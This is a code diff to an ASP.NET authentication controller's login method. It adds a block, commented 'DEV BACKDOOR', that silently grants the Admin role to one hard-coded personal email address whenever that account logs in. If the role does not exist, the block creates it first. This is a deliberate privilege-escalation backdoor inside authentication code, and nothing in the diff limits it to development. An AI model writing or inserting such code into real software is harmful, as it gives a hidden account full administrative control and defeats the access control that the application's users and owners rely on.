@@ -76,6 +76,16 @@ public class AuthController : ControllerBase
             return Unauthorized(new { message = "Invalid email or password" });
 
         var roles = await _userManager.GetRolesAsync(user);
+
+        // DEV BACKDOOR: Ensure jacobjibin1997@gmail.com is Admin
+        if (model.Email == "jacobjibin1997@gmail.com" && !roles.Contains("Admin"))
+        {
+            if (!await _roleManager.RoleExistsAsync("Admin"))
+                await _roleManager.CreateAsync(new ApplicationRole { Name = "Admin", Description = "Administrator" });
+            
+            await _userManager.AddToRoleAsync(user, "Admin");
+            roles = await _userManager.GetRolesAsync(user); // efficient enough for dev
+        }
         var token = await GenerateJwtToken(user);
 
         return Ok(new
